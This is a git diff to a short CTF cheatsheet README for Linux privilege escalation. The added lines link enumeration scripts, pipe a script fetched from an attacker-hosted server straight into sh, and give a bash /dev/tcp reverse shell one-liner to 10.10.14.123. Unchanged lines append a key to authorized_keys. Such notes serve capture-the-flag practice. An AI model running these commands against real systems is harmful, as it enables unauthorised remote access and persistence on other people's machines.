@@ -1,5 +1,20 @@
 # ctf-cheatsheet
 This repo comprises useful code bytes for solving common ctf tasks.
+
+## good enum scripts
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+https://github.com/rebootuser/LinEnum
+```bash
+sudo python -m SimpleHTTPServer 80
+curl 10.10.10.10/linpeas.sh | sh
+```
+
+### search for string in files
+```
+grep -r "string"
+```
+
+
 ## initial tasks and enumeration
 ## linux privileges
 ##### exploits/privesc for common binaries
@@ -19,7 +34,17 @@ echo "public key on kali" >> authorized_keys
 python -m SimpleHTTPServer 4004
 python3 -m http.server 4004
 ```
-##### upgrade shell with python
+##### find out which shell is used
+```bash
+echo $0
+```
+##### upgrade shell with sh to bash, spawn reverse shell
+```bash
+whereis bash
+/user/bin/bash
+bash -i >& /dev/tcp/10.10.14.123/4004 0>&1
+```
+##### upgrade shell with python to bash
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
